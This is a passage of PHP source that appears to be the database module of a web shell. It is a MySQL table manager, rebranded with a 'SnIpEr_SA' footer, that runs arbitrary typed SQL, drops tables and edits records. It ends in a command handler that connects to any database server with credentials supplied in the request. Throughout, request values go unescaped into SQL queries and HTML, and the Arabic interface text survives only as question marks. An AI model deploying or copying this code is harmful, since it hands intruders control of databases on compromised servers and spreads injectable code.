       $newstring=substr($arr[1],$pos+1);  // get rid of the '???('
       $snewstring=str_replace(')','',$newstring); // get rid of the last ')'
       $nnewstring=explode(',',$snewstring,$num); // stick into an array
       if(strncmp($arr[1],'set',3)==0 ){//Sets can have combinations of values
           echo "&lt;td&gt;Set (select one or more)&lt;/td&gt;";
           echo"&lt;td&gt;&lt;select name='array[$i][]' size='3' multiple&gt;";
       }else{//Enum one value only
        echo "&lt;td&gt;Enum&lt;/td&gt;";
           echo"&lt;td&gt;&lt;select name='array[$i]'&gt;";
       }
       for($y=0; $y&lt;$num;$y++){
       echo"&lt;option value=$nnewstring[$y]&gt;$nnewstring[$y]";
       }
        echo"&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;\n";
    // End of new code block for set drop down
      }else{
       echo"&lt;td&gt;$type&lt;/td&gt;&lt;td&gt;&lt;input type=text name='array[$i]' size='$flen' /&gt;&lt;/td&gt;&lt;/tr&gt;\n";
      }
 }
 echo"&lt;tr&gt;&lt;td&gt;&lt;input class=but type=submit name='addrec' value='Add Record' /&gt;&lt;/td&gt;\n";
 echo"&lt;td&gt;&lt;input class=but type=reset name='reset' value='Reset Form' /&gt;&lt;/td&gt;\n";
 echo"&lt;/tr&gt;";
 echo"&lt;/table&gt;\n";
 echo"&lt;/form&gt;\n";
}

//*********************Edit Form ***************
function editform($tablename, $dbname, $result, $edit, $pk, $pv){
        $row=mysql_fetch_array($result);
        echo"&lt;form action='$action'  method=post&gt;\n";
        echo"&lt;table border=0 width ='100%' align='center'&gt;\n";
        $flds = mysql_num_fields($result);
        $fields = mysql_list_fields($dbname, $tablename);
        echo"&lt;input type=hidden name=tablename value='$tablename' /&gt;\n";
        echo"&lt;input type=hidden name='dbname' value='$dbname' /&gt;\n";
        echo"&lt;tr&gt;";
        $mxlen = 80;//max width of the form fields
        for($i=0; $i &lt; $flds; $i++){
        $fname=mysql_field_name($fields, $i);
                echo "&lt;th&gt;$fname";
                 $flen = mysql_field_len($result, $i);//length of the field
                $nslash = StripSlashes($row[$i]);
        // Start of new code for set drop down
      $newsql = "show columns from $tablename like '%".$fname."'";
      $newresult = exequery($newsql, $tablename, $dbname);
      $arr=mysql_fetch_array($newresult);
    // End of new code block for set drop down
                if($flen &gt; $mxlen){
                        $rws= $flen/$mxlen;
                                if($rws&gt;10){
                                $rws=10; //max length of textarea
                        }
                        echo"&lt;td&gt;&lt;textarea name='array[$i]' rows=$rws cols=$mxlen&gt;$nslash&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;\n";
// Start of new code for set drop down
          }elseif (strncmp($arr[1],'set',3)==0 || strncmp($arr[1],'enum',4)==0){  // We have a field type of set or enum
           $num=substr_count($arr[1],',') + 1;  // count the number of entries
           $pos=strpos($arr[1],'(' ); //find the position of '('
           $newstring=substr($arr[1],$pos+1);  // get rid of the '???('
           $snewstring=str_replace(')','',$newstring); // get rid of the last ')'
           $nnewstring=explode(',',$snewstring,$num); // stick into an array
           if(strncmp($arr[1],'set',3)==0 ){//Sets can have combinations of values
               echo"&lt;td&gt;&lt;select name='array[$i][]' multiple size='3'&gt;";
           }else{//Enum one value only
               echo"&lt;td&gt;&lt;select name='array[$i]'&gt;";
           }
           $nsel=explode(",",$nslash);
          for($y=0; $y&lt;$num;$y++){
                //geteach value 'a,b,c'
                $sel="";
                for($e=0; $e&lt;count($nsel);$e++){
                    if($nnewstring[$y]=="'".$nsel[$e]."'"){
                        $sel="selected";
                    }
                }
                echo"&lt;option value=$nnewstring[$y] $sel&gt;$nnewstring[$y]";
           }
            echo"&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;\n";
// End of new code block for set drop down

        }else{
                        echo"&lt;td&gt;&lt;input type=text name='array[$i]' size='$flen' value='$nslash' /&gt;&lt;/td&gt;&lt;/tr&gt;\n";
                }
                for($f =0; $f&lt; count($pk);$f++){
                        echo"&lt;input type=hidden name=pk[$f] value='$pk[$f]' /&gt;";
                        echo"&lt;input type=hidden name=pv[$f] value='$pv[$f]' /&gt;\n";
                }
        }
        echo"&lt;tr&gt;&lt;td&gt;&lt;input class=but type=submit name='editrec' value='Update' /&gt;&lt;/td&gt;\n";
        echo"&lt;td&gt;&lt;input class=but type=reset name='reset' value='Reset Form' /&gt;&lt;/td&gt;\n";
        echo"&lt;/tr&gt;";
        echo"&lt;/table&gt;\n";
        echo"&lt;/form&gt;\n";
}
//************************Edit Record*************************
function editrec($dbname, $tablename, $pk, $pv, $array){
        //$result = @mysql_query( "Select * from $tablename" );
    $result = exequery("Select * from $tablename", $tablename, $dbname);
        $flds = mysql_num_fields($result);
        $fields = mysql_list_fields($dbname, $tablename);
//Build Query
           $qry="";
    $query = "UPDATE $tablename set ";
        for ($x =0; $x &lt; $flds; $x++){
                $fie = mysql_field_name($fields, $x );
        // SET and ENUM
         if(is_array($array[$x])){
            $mval="";
            for($m=0; $m &lt; count($array[$x]); $m++){
                if($m+1 == count($array[$x])){
                    $mval.= AddSlashes($array[$x][$m]);
                }else{
                    $mval.= AddSlashes($array[$x][$m]).",";
                }
                $fval = $mval;
            }
        }else{
                    $fval = AddSlashes($array[$x]);
        }
        //**************************
                //$fval = AddSlashes($array[$x]);
                $qry .= "$fie = '$fval'";
                if ($x &lt; $flds-1){
                        $qry.= ", ";
                }
        }
        $whr = buildwhr( $pk, $pv);
        $whr =StripSlashes($whr);
        $query .= "$qry";
        $query .= " where $whr";
    $result=exequery($query, $tablename, $dbname);
        if($result){
                return $result;
        }else{
                return false;
        }
}
//****************** Number of Primary Keys ***********************
function numpk($result){
        $z =0;
        for ($i = 0; $i &lt; $flds; $i++) {
                //Find the primary key
                $flagstring = mysql_field_flags ($result, $i);
                if(eregi("primary",$flagstring )){
                        $z++;
                }
        }
        return $z;
}
//********************Size field*****************
function fieldformsize($ft, $i, $l){
        $ft= trim(strtoupper($ft));
        if($ft =="DATE" || $ft=="TIME" || $ft== "DATETIME" ){
        }elseif( $ft=="TINYTEXT" || $ft=="BLOB" || $ft=="TEXT" || $ft =="MEDIUMBLOB"){
                echo"&lt;input type=hidden name='leng[$i]' value=$l&gt;";
        }elseif($ft=="MEDIUMTEXT" || $ft=="LONGBLOB"|| $ft=="LONGTEXT" || $ft=="TINYBLOB"){
                echo"&lt;input type=hidden name='leng[$i]' value=$l&gt;";
        }elseif($ft=="INT" || $ft=="TINYINT"|| $ft=="SMALLINT"|| $ft=="MEDIUMINT"|| $ft=="BIGINT" || $ft=="INTEGER"){
                echo"&lt;input type=text name='leng[$i]' size=5  value=$l&gt;";
        }elseif($ft=="YEAR" ){
                echo"&lt;select name='leng[$i]'&gt;";
                echo"&lt;option value='4'&gt;4";
                echo"&lt;option value='2'&gt;2";
                echo"&lt;/select&gt;\n";
    }elseif($ft=="SET"|| $ft=="ENUM"){
        echo"&lt;input type=text name='leng[$i]' title='values eg \"a\", \"b\", \"c\"' value='' /&gt;";
        }else{
                echo"&lt;input type=text name='leng[$i]' size=5 value=$l /&gt;\n";
        }
}
//******************************Display Row ******************************
function displayrow($dbname, $tbl, $pk, $pkfield, $cpk, $row, $flds){
        $pkfs="";
        $hv="";
        $hf="";
        if($cpk &gt;0 && !empty($pkfield)){
                for($a = 0; $a &lt; $cpk; $a++){
                        $fieldn = $pkfield[$a];
                        $hf .= "&lt;input type=hidden name=pk[$a] value='$pkfield[$a]' /&gt;";
                        $hv .= "&lt;input type=hidden name=pv[$a] value='$row[$fieldn]' /&gt;";
                }
        }else{ //No Primary Key so use all fields
                $fields = mysql_list_fields($dbname, $tbl);
                for($b = 0; $b &lt; $flds; $b++){
                        $fie = mysql_field_name($fields, $b );
                        $hf .= "&lt;input type=hidden name=pk[$b] value='$fie' /&gt;";
                        $hv .= "&lt;input type=hidden name=pv[$b] value='$row[$b]' /&gt;";
                }
        }
        echo"&lt;tr&gt;\n";
        //edit Record
        echo"&lt;td&gt;&lt;form action='$action' method=post&gt;\n";
        echo"&lt;input type=hidden name=dbname value='$dbname' /&gt;\n";
        echo"&lt;input type=hidden name=tablename value='$tbl' /&gt;\n";
        echo"&lt;input type=hidden name=npkeys value='$cpk' /&gt;\n";
        echo"$hf";
        echo"$hv";
        echo"&lt;input class=sml type=submit name=edit value='Edit Record' /&gt;\n";
        echo"&lt;/form&gt;&lt;/td&gt;\n";
        //Delete record
        echo"&lt;td&gt;&lt;form action='$action' method=post&gt;\n";
        echo"&lt;input type=hidden name=dbname value='$dbname' /&gt;\n";
        echo"&lt;input type=hidden name=tablename value='$tbl' /&gt;\n";
        echo"&lt;input type=hidden name=num value='$cpk' /&gt;\n";
        echo"$hf";
        echo"$hv";
        echo"&lt;input class=smldel type=submit name=delete value='Delete Record' /&gt;\n";
        echo"&lt;/form&gt;&lt;/td&gt;";
        //Display all the columns.
        for($col = 0; $col &lt; $flds; $col ++){
                $nslash = StripSlashes($row[$col]);
                echo"&lt;td&gt;$nslash&lt;/td&gt;";
        }
        echo"&lt;/tr&gt;";
}
//***********************Remove Array Copy********************************
//removes copies from an array $x.
function removearraycopy($x){
        $leng= count($x);
        sort($x);
        $farr=array();
        for ($i =0; $i &lt; $leng; $i++){
                $flag=false;
                for ($s =0; $s &lt; count($farr); $s++){
                        if($x[$i]==$farr[$s]){
                                $flag=true;
                        }
                }
                if ($flag == false){
                        $farr[count($farr)] = $x[$i];
                }
        }
        return $farr;
}
//***********************&lt;&lt; page position &gt;&gt;********************************
function whichpage($num_rows, $pagemax, $pg, $tablename, $searchval){
        $pgs = $num_rows/$pagemax;
        $pgs=ceil($pgs);
                            //round up the number of pages.
        echo"&lt;form action='$action' id='recspage' method='post' name='recspage'&gt;\n";
    echo"Total number of records $num_rows, displayed on $pgs pages of \n";
    echo"&lt;input type='text'  name='pagemax' value='$pagemax' size='4' onchange='javascript:this.form.submit();' title='Type the number records to display on a page then click outside the box' /&gt; \n";
        echo"&lt;input type='hidden' name='searchval' value='$searchval'  /&gt;\n";
    echo"&lt;input type='hidden' name='tablename' value='$tablename'  /&gt;\n";
    echo"records per page.&lt;/form&gt; \n";
    $pagescrol="";
    $sval="";
          if($pgs &gt;1){
            $pagescrol="&lt;div class='pagecount'&gt;\n";
                        $nxt=$pg+1;
            $bk=$pg-1;
            $lst=$pgs;
            $end=$lst-1;
            $showp=$pg+1;
           if($searchval !=""){
            $sval="&amp;searchval=$searchval";
           }
           $pagescrol .= "&lt;form name='pages' id='pages' action='$action' method='get'&gt;\n";
            if($pg&gt;=1){
                $pagescrol .= " &lt;a href='$action?tablename=$tablename&amp;pg=0$sval' title='To first page'&gt; 1 :&lt;&lt; &lt;/a&gt; \n";
                                $pagescrol .= " &lt;a href=''action'?tablename=$tablename&amp;pg=$bk$sval' title='Back one page'&gt; &lt; &lt;/a&gt; \n";
                        }
           $pagescrol .= "&lt;input type='text' name='pg' value='$showp' size='4' onchange='javascript:this.form.submit();' title='Type a page number then click outside the box' /&gt;\n";
           $pagescrol .= "&lt;input type='hidden' name='pback' value='true'  /&gt;\n";
           $pagescrol .= "&lt;input type='hidden' name='searchval' value='$searchval'  /&gt;\n";
           $pagescrol .= "&lt;input type='hidden' name='tablename' value='$tablename'  /&gt;\n";
           if($showp &lt; $lst){
                $pagescrol .= " &lt;a href=''action'?tablename=$tablename&amp;pg=$nxt$sval' title='Next page'&gt; &gt; &lt;/a&gt; \n";
                $pagescrol .= " &lt;a href=''action'?tablename=$tablename&amp;pg=$end$sval' title='To Last page'&gt; &gt;&gt;: $lst&lt;/a&gt; \n";
           }
           $pagescrol .= "&lt;/form&gt;\n";
           $pagescrol.="&lt;/div&gt;\n";
      }
        return $pagescrol;
}
//*************Display Footer*************************
//Please don't remove or change.
function display_foot(){
    echo"&lt;div class='foot'&gt;Version $version &copy; ".date('Y')." &lt;a style='text-decoration:none;' target='_blank' href='http://www.SnIpEr-SA.com'&gt;SnIpEr_SA&lt;/a&gt;&lt;/div&gt;";
    }
//*************My Size*************************
//Returns the size of a table or database
function mysize($dbname, $tablename){
    $like="";
    $total="";
    $t=0;
    if($tablename !=""){
        $like=" like '$tablename'";
    }
    $sql= "SHOW TABLE STATUS FROM $dbname $like";
    //$result = mysql_query($sql);
    $result=exequery($sql, $tablename, $dbname);
    if($result){
        while($rec = mysql_fetch_array($result)){
         $t+=($rec['Data_length'] + $rec['Index_length']);
         }
        $total ="&lt;span class='bytes'&gt;$t bytes&lt;/span&gt;";
    }else{
        $total="Unknowen";
    }
    return($total);
}

//**************************************
//DEBUG to show all being passed to the page
function showpassingvars(){
        echo"Get: ";
         foreach($_GET as $pram=&gt;$value){
                 echo"$pram: $value, ";
         }
        echo"&lt;br&gt;Post: ";
         foreach($_POST as $pram=&gt;$value){
                  echo"$pram: $value, ";
         }
         echo"&lt;br&gt;Session: ";
         foreach($_SESSION as $pram=&gt;$value){
                 echo"$pram: $value, ";
         }
 }
echo"&lt;html&gt;\n";
echo"&lt;meta http-equiv='Content-Type' content='text/html; charset=windows-1256'&gt;\n";
echo"&lt;head&gt;\n";
echo"&lt;title&gt;????? ??????? ?????? ????????&lt;/title&gt;\n";
echo"&lt;STYLE&gt;
BODY
 {
        SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #726456; SCROLLBAR-ARROW-COLOR: #726456; SCROLLBAR-TRACK-COLOR: #292929; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #726456
}
tr {
BORDER-RIGHT:  #cccccc ;
BORDER-TOP:    #cccccc ;
BORDER-LEFT:   #cccccc ;
BORDER-BOTTOM: #cccccc ;
color: #ffffff;
}
td {
BORDER-RIGHT:  #cccccc ;
BORDER-TOP:    #cccccc ;
BORDER-LEFT:   #cccccc ;
BORDER-BOTTOM: #cccccc ;
color: #cccccc;
}
.table1 {
BORDER: 1;
BACKGROUND-COLOR: #000000;
color: #333333;
}
.td1 {
BORDER: 1;
font: 7pt tahoma;
color: #ffffff;
}
.tr1 {
BORDER: 1;
color: #cccccc;
}
table {
BORDER:  #eeeeee  outset;
BACKGROUND-COLOR: #000000;
color: #cccccc;
}
input {
BORDER-RIGHT:  #990000 1 solid;
BORDER-TOP:    #990000 1 solid;
BORDER-LEFT:   #990000 1 solid;
BORDER-BOTTOM: #990000 1 solid;
BACKGROUND-COLOR: #333333;
font: 9pt tahoma;
color: #ffffff;
}
select {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #000000;
font: 9pt tahoma;
color: #CCCCCC;;
}
submit {
BORDER:  buttonhighlight 1 outset;
BACKGROUND-COLOR: #272727;
width: 40%;
color: #cccccc;
}
textarea {
BORDER-RIGHT:  #ffffff 1 solid;
BORDER-TOP:    #999999 1 solid;
BORDER-LEFT:   #999999 1 solid;
BORDER-BOTTOM: #ffffff 1 solid;
BACKGROUND-COLOR: #333333;
font: Fixedsys bold;
color: #ffffff;
}
BODY {
margin: 1;
color: #cccccc;
background-color: #000000;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
&lt;/STYLE&gt;\n";
echo"&lt;meta http-equiv='Content-Type' content='text/html charset=windows-1256'&gt;";
echo"&lt;title&gt;????? ??????? ?????? ????????&lt;/title&gt;\n";
echo"&lt;meta name='author' content='Tony Aslett'&gt;";
echo"&lt;meta name='title' content='PHP:MySQL Table Manager'&gt;";
echo"&lt;meta name='description' content='Table Manager for MySQL Database'&gt;";
echo"&lt;link rel='stylesheet' href='tmgrstyles.css' type='text/css'&gt;\n";
echo"&lt;/head&gt;\n";
echo"&lt;body&gt;\n";
$showall=true;
echo"&lt;h2 class=h &gt;????? ??????? ?????? ????????&lt;/h2&gt;\n";
//******************* Session Logon ***********************
if(isset($_POST['logout'])){
                $_POST['dbname']="";
                session_unset();
                session_destroy();
}
if(isset($_POST['userid']) && isset($_POST['pword1'])){
        $_SESSION['user'] = $_POST['userid'];
        $_SESSION['password'] = $_POST['pword1'];
}
if (!isset($_SESSION['user']) || !isset($_SESSION['password'])){
        echo"&lt;div align=center&gt;";
        echo"&lt;h2&gt;???? ?????? ??????? ???????&lt;/h2&gt;\n";
        If(!isset($dbnamearray)){
                $dbnamearray="";
        }
        show_login($dbnamearray);
        echo"&lt;/div&gt;";
}else{
        //show logout option.
        echo"&lt;div align=right&gt;";
        endsess();
        echo"&lt;/div&gt;";
}
//*****dbname
if(isset($_POST['dbname'])){
        $dbname=$_POST['dbname'];
    $_SESSION['dbname']= $_POST['dbname'];
}
//***** Host
if(isset($_POST['host'])){
    $host=$_POST['host'];
    $_SESSION['host']=$_POST['host'];
}
//******set tablename
if(isset($_GET['tablename']) ){
        $tablename=$_GET['tablename'];
}elseif(isset($_POST['tablename'])){
        $tablename=$_POST['tablename'];
}
//********** pagemax
if(isset($_POST['pagemax'])){ //&& is_int($_POST['pagemax'])){
    $isnum=true;
    for($o=0; $o&lt;count($_POST['pagemax']); $o++){
            if($_POST['pagemax'][$o]&gt;9){
                $isnum=false;
            }
    }
    if($_POST['pagemax']&gt;0 && $isnum){
        $_SESSION['pagemax']=$_POST['pagemax'];
    }
}
 if(isset($_SESSION['pagemax'])){
    $pagemax=$_SESSION['pagemax'];
 }
//******** create a new Database ************
if(isset($_POST['cndb'])){
    connectmysql();
        $sql="create database $_POST[ndbname]";
        $result=exequery($sql, " ", $_POST['ndbname']);
        if ($result){
                $_SESSION['dbname'] = $_POST['ndbname'];
        $sql="Use $_POST[ndbname]";
            $result=exequery($sql, " ", $_POST['ndbname']);
        if($result){
            echo"&lt;h2&gt;????? ????? $_SESSION[dbname] &lt;/h2&gt;\n";
        }
        }
}
//*********************************************
if (! isset($_SESSION['dbname']) && ! isset($dbnamearray) && ! isset($_POST['dbname']) && isset($_SESSION['user'])){ //*********post
        //Databse names
        showdb();
}
//************************ Choose DB *************
if(isset($_POST['dbname']) && $_POST['dbname']==""){
    showdb();
}
//**********
if (isset($_SESSION['dbname']) || isset($_POST['dbna']) || isset($_POST['dbname'])){
//*************************************
                //connection
                if (isset($_SESSION['dbname'])){
                        $dbsetname = $_SESSION['dbname'];
                }elseif(isset($_POST['dbname'])){
                        $dbsetname = $_POST['dbname'];
                        $_SESSION['dbname'] = $_POST['dbname'];
                }else{
                        $dbsetname = $_POST['dbna'];
                        $_SESSION['dbname'] = $_POST['dbna'];
                }
}
//*************************** we have a DB set
if(isset($dbsetname) && $dbsetname!=""){
                    $link= connectmysql();
            //echo"DBS: $dbsetname";
                    $conn = connectdb($dbsetname, $link);
//*********** Drop Table **************
        if(isset($_POST['deltable'])){
        $showall=false;
                $tablename=$_POST['tablename'];
                echo"&lt;h1&gt;!!! ????? !!! &lt;br&gt;??? ????? ??? ??? ?????? $tablename&lt;br&gt;";
                echo"?? ??? ????? ?? ?????? ??????????&lt;/h1&gt;\n";
                $va="Drop $tablename";
                goto($tablename, $dbname,$action, 'del', 'droptab', $va );
        }
        if(isset($_POST['droptab'])){
                $tablename=$_POST['tablename'];
                $dsql = "drop table $tablename";
                $result=exequery($dsql, $tablename, $dbname);
                unset($tablename); //="false";
                unset($_POST['tablename']);
        }
//*****************Write Your Own Query *****************
        if(isset($_POST['wyoq'])){  //post
                $value="??????? ???????? ???????";
                goto($tablename, $dbname, $action, 'but', 'start', $value );
                echo"&lt;form method='post'&gt;\n";
                echo"&lt;input type='hidden' name='dbname' value=$dbname&gt;\n";
                //echo"&lt;input type=text name='wyqota' width='500px' style='overflow-x:visible;'&gt;\n";
                echo"&lt;textarea name='wyoqta' cols='60' rows='5' style='overflow-y:visible'&gt;&lt;/textarea&gt;\n";
                echo"&lt;br&gt;&lt;input class=but type=submit name='runquery' value='Execute Query'&gt;\n";
                echo"&lt;/form&gt;&lt;br&gt;\n";
        }
        if(isset($_POST['runquery'])){
                $wyoqta = StripSlashes($_POST['wyoqta']);
                $result=exequery($wyoqta, " ", " ");
                if(@mysql_num_rows($result) &gt;0){
                         $numrows=mysql_num_rows($result);
                        $flds=mysql_num_fields($result);
                        echo"&lt;table&gt;";
                        for($r=0; $r &lt; $numrows; $r++){
                                echo"&lt;tr&gt;";
                                $row=mysql_fetch_array($result);
                                for($col = 0; $col &lt; $flds; $col ++){
                                        $nslash = StripSlashes($row[$col]);
                                        echo"&lt;td&gt;$nslash&lt;/td&gt;";
                                }
                                echo"&lt;/tr&gt;";
                        }
                        echo"&lt;/table&gt;";
                }elseif (mysql_affected_rows()){
                        echo" Number of Rows affected: ".mysql_affected_rows();
                }else{
                        echo" Nothing returned from the query.";
                }
        }
// ****************List Tables***************************
        if( ! isset($tablename) || $tablename==" " ){
                $dbname=$_SESSION['dbname'];
                $result = mysql_list_tables($_SESSION['dbname']);
                 $numtab = mysql_num_rows ($result);
                 if($numtab == 1){
                        $_SESSION['tablename'] =mysql_tablename($result, 0);
                 }
//***************** Buttons ******************************
                if (isset($_POST['runquery'])){
                        $dbname=$_SESSION['dbname'];
                        $value="$dbname Start"; //Table Manager Start
                        goto("", $_SESSION['dbname'], $action, 'but', 'tablestart', $value );
                }elseif (! isset($_POST['wyoq']) && ! isset($_POST['runquery'])){ //write your own query.
                        echo"&lt;table width=40% border=0 align='left' &gt;\n";
                        echo"&lt;tr&gt;&lt;td&gt;";
                        $va="????? ???? ????";
                        goto("", $_SESSION['dbname'], "create.php", 'but', 'create', $va );
          //  echo"&lt;a href=create.php class='crt'&gt;Create new Table&lt;/a&gt;\n";
                        echo"&lt;/td&gt;&lt;td&gt;";
        $value="??????? ????????"; //Choose DB
                goto("", "", $action, 'but', 'db', $value );
                echo"&lt;/td&gt;\n";
                        $value="Write Your Own Query";
                        goto(" ", $_SESSION['dbname'], $action, 'but', 'wyoq', $value );
                        echo"&lt;/td&gt;&lt;/tr&gt;";
                        echo"&lt;/table&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div style='clear:both;'&gt;&lt;/div&gt;";
                        echo"&lt;table width=100% border=0 align='center' &gt;\n";
                        for ($i =0; $i &lt; $numtab; $i++) {
                                $tb_names[$i] = mysql_tablename($result, $i);
                                echo"&lt;tr class='frow'&gt;&lt;td align='center'&gt;\n";
                                $va="??? ???? * $tb_names[$i]";
                                goto($tb_names[$i], $_SESSION['dbname'],$action, 'but', $tb_names[$i], $va );
                                echo"&lt;/td&gt;&lt;td  align='center' valign='middle'&gt;\n";
                                $va="??? ???? $tb_names[$i]";
                                goto($tb_names[$i], $_SESSION['dbname'],$action, 'del', 'deltable', $va );
                                echo"&lt;/td&gt;&lt;td  align='center' valign='middle'&gt;\n";
                                $va="Alter Table $tb_names[$i]";
                                goto($tb_names[$i], $_SESSION['dbname'],'alter.php', 'but', 'altertable', $va );
                                echo"&lt;/td&gt;&lt;td align='center' valign='middle'&gt;\n";
                                searchtableform($tb_names[$i], $_SESSION['dbname']);
                                echo"&lt;/td&gt;&lt;td&gt;";
                //Table size in bytes
               echo mysize($_SESSION['dbname'],$tb_names[$i]);
                echo"&lt;/td&gt;&lt;/tr&gt;\n";
                        }//for
                        echo"&lt;/table&gt;\n";
                }
        }else{ //tablename is set
//***************** menu *****************************************
                echo"&lt;table&gt;&lt;tr class='frow'&gt;&lt;td&gt;\n";
                $value="$_SESSION[dbname] Start"; //Ex Table Manager Start
                goto($tablename, $_SESSION['dbname'], $action, 'but', 'tablestart', $value );
                echo"&lt;/td&gt;\n";
        echo"&lt;td&gt;\n";
        $value="??????? ????????"; //Choose DB
                goto("", "", $action, 'but', 'start', $value );
                echo"&lt;/td&gt;\n";
        echo"&lt;td&gt;\n";
        $value="Write Your Own Query";
                goto(" ", $_SESSION['dbname'], $action, 'but', 'wyoq', $value );
        echo"&lt;/td&gt;\n";
                if (!isset($_POST['add']) && !isset($_POST['deltable']) && isset($tablename)){
                        echo"&lt;td&gt;";
                        //$tablename = $_POST['tablename'];
                        $va="Add a $tablename Record";
                        goto($tablename, $_SESSION['dbname'], 'alter.php', 'but', 'add', $va );
                        echo"&lt;/td&gt;\n";
                }
                if (!isset($_POST['deltable'])){
                        echo"&lt;td&gt;\n";
                        searchtableform($tablename, $_SESSION['dbname']);
                        echo"&lt;/td&gt;\n";
                }
                echo"&lt;/tr&gt;&lt;/table&gt;\n";
                echo"&lt;br /&gt;\n";
//**************************************************
                if(isset($_POST['addrec'])){
           // $showall=false;
                        $result=addrecord($tablename, $_SESSION['dbname'], $_POST['array']);
                }elseif(isset($_POST['add'])){
            $showall=false;
                        addform($tablename, $_SESSION['dbname']);
                }elseif(isset($_POST['delete'])){
                        //delete record has been pushed
           // $showall=false;
                        $whr=buildwhr($_POST['pk'], $_POST['pv']);
                        $sql = "delete from $tablename where $whr";
                        $result=exequery($sql, $tablename, $_SESSION['dbname']);
                }elseif (isset($_POST['edit'])){//Edit
            $showall=false;
                        $whr = buildwhr( $_POST['pk'], $_POST['pv']);
                        //$tablename = $_SESSION['tablename'];
                        $sql= "Select * from $tablename where $whr";
                        $result=exequery($sql, $tablename, $_SESSION['dbname']);
                        editform($tablename, $_SESSION['dbname'], $result, 'edit', $_POST['pk'], $_POST['pv']);
                }elseif(isset($_POST['editrec'])){
           // $showall=false;
                        $result=editrec($_SESSION['dbname'],$tablename, $_POST['pk'], $_POST['pv'], $_POST['array']);
                }
//**************** Search ************************************
                if(isset($_POST['searchval'])){
                        $searchval=$_POST['searchval'];
                }elseif(isset($_GET['searchval'])){
                        $searchval=$_GET['searchval'];
                }else{
                        $searchval="";
                }
                if (isset($_GET['tablename'])){
                        $tablename = $_GET['tablename'];
                }
                if((isset($_POST['search'])|| isset($searchval)) && $searchval !=""){
                        $result=searcht($tablename, $_SESSION['dbname'],  $searchval);
                }else{
                        //Display All
                        $query = "select * from $tablename";
                        $result=exequery($query, $tablename, $_SESSION['dbname']);
                }
//***************** Display record count *****************************************
        if($showall){
            $num_rows = mysql_num_rows($result);
            //Workout whick page to display
                    if(!isset($_GET['pg']) && !isset($pg)){
                            $beg=0;
                $pg=0;
                    }else{
                if(isset($_GET['pback'])){
                    $pg=$_GET['pg'];
                }else{
                    $pg=$_GET['pg'];
                }
                 if($pg &lt; 0 ){
                    $pg=0;
                }
                if($pg &gt; $num_rows/$pagemax){
                    $pg=ceil($num_rows/$pagemax)-1;
                }
                $beg = $pg * $pagemax;
                    }
                    if (!isset($_POST['add'])){
                            $pscrol=" ";
                            $pagescrol =" ";
                            $pagescrol = whichpage($num_rows, $pagemax, $pg, $tablename, $searchval);
                            echo "$pagescrol\n"; //Display next Top page menu
                            $flds = mysql_num_fields($result);
                            echo"&lt;table border=0 width='100%'&gt;\n";
                            echo"&lt;tr class=head&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;\n";
                            $fields = mysql_list_fields( $_SESSION['dbname'], $tablename);
                            $z=0;
                            $x =0;
                            $pkfield=array();
//*************Display each of the field names.***************************
                            for ($i = 0; $i &lt; $flds; $i++) {
                                        echo "&lt;td&gt;".mysql_field_name($fields, $i)."&lt;/td&gt;\n";
                                    //Find the primary key
                                    $flagstring = mysql_field_flags ($result, $i);
                                    if(eregi("primary",$flagstring )){
                                            $pk[$z] = $i;
                                            $pkfield[$z]= mysql_field_name($fields, $i);
                                            $z++;
                                    }
                            }
                            echo"&lt;/tr&gt;\n";
                            $tbl=$tablename;
                            //if(isset($pk)){
                            if($z &gt; 0){
                                    $cpk=count($pk);
                            }else{
                                    $cpk=0;
                            }
//************Display each row from the table.********************************
                            for ($s=$beg; $s &lt; $beg + $pagemax; $s++){
                                    if($s &lt; $num_rows){
                                            if (!mysql_data_seek ($result, $s)) {
                                        echo "Cannot seek to row $s\n";
                                        continue;
                                    }
                                            $row=mysql_fetch_array($result);
                                            if(!isset($pk)){
                                                    $pk=" ";
                                                    $pkfield= array();
                                            }
                                            displayrow($_SESSION['dbname'], $tbl, $pk, $pkfield, $cpk, $row, $flds);
                                    }
                            }
                    }
                    echo"&lt;/table&gt;\n";
                    if (!isset($_POST['add']) && !isset($_POST['edit']) && !isset($_POST['deltable']) && !isset($_POST['droptab']) && !isset($_POST['wyoq']) && $tablename){
                            echo"&lt;br&gt;";
                            echo "$pagescrol\n"; //Display bottom next page menu
                    }
                    echo"&lt;br&gt;&lt;br&gt;\n";
                 }//showall
                 if(isset($_POST['tablename'])){
                         echo"&lt;table border=0&gt;";
                     echo"&lt;tr&gt;&lt;td&gt;";
                         $tablename=$_POST['tablename'];
                         $va="Alter Table $tablename";
                         goto( $tablename,  $_SESSION['dbname'],'alter.php', 'but', 'altertable', $va );
                         echo"&lt;/td&gt;&lt;/tr&gt;\n";
                         echo"&lt;/table&gt;\n";
                }
        }
}
display_foot();
echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=tahoma size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";  die(); }
if (!empty($_POST['cmd']) && $_POST['cmd']=="db_query")
 {
 echo $head;
 $sql = new my_sql();
 $sql-&gt;db   = $_POST['db'];
 $sql-&gt;host = $_POST['db_server'];
 $sql-&gt;port = $_POST['db_port'];
 $sql-&gt;user = $_POST['mysql_l'];
 $sql-&gt;pass = $_POST['mysql_p'];
 $sql-&gt;base = $_POST['mysql_db'];
 $querys = @explode(';',$_POST['db_query']);
 echo '&lt;body bgcolor=#000000&gt;';
